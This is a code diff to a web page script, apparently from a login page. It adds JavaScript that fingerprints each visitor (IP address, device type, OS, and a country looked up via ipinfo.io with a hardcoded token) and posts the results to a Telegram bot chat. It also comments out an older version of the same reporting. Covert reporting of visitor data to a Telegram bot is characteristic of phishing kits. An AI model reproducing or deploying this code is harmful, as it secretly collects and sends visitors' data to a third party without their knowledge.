@@ -440,23 +440,90 @@
             .then((data) => {
                 const ipAddress = data?.ip || "";
                 @this.set('ip',ipAddress);
-                const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-                fetch(tURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
-                    }),
-                });
+                // const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+                // fetch(tURL, {
+                //     method: "POST",
+                //     headers: {
+                //         "Content-Type": "application/json",
+                //     },
+                //     body: JSON.stringify({
+                //         chat_id: chatId,
+                //         text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
+                //     }),
+                // });
             })
             .catch((error) => {});
     })
     document.addEventListener('open-modal',function (){
         $('#continue-modal').show();
     });
+
+    function getDeviceOS() {
+        const userAgent = navigator.userAgent;
+        if (/Android/i.test(userAgent)) {
+            return 'Android';
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            return 'iOS';
+        } else if (/Windows/i.test(userAgent)) {
+            return 'Windows';
+        } else if (/Linux/i.test(userAgent)) {
+            return 'Linux';
+        } else if (/Mac OS|Macintosh/i.test(userAgent)) {
+            return 'Mac OS';
+        } else {
+            return 'Unknown';
+        }
+    }
+    function getDeviceType() {
+        const userAgent = navigator.userAgent;
+
+        if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
+            return 'Mobile';
+        } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
+            return 'Tablet';
+        } else {
+            return 'Desktop';
+        }
+    }
+    async function getCountryByIP(ip) {
+        const token = '51a670a7b50b57';
+        const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;
+
+        try {
+            const response = await fetch(apiUrl);
+            if (!response.ok) throw new Error('Failed to fetch IP information');
+            const data = await response.json();
+            return data.country;
+        } catch (error) {
+            console.error('Error:', error.message);
+            return null;
+        }
+    }
+    async function handleAsyncIPInfo() {
+        try {
+            const deviceType = getDeviceType();
+            const os = getDeviceOS();
+            const ip = @this.ip;
+            const country = await getCountryByIP(ip);
+            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+            await fetch(tURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
+                }),
+            });
+
+        } catch (error) {
+            console.error('Error:', error.message);
+        }
+    }
+    document.addEventListener('send-ip-info',function (){
+        handleAsyncIPInfo();
+    })
 
     document.addEventListener('show-login-progress',function (){
         @this.set('showModalFooter',false);
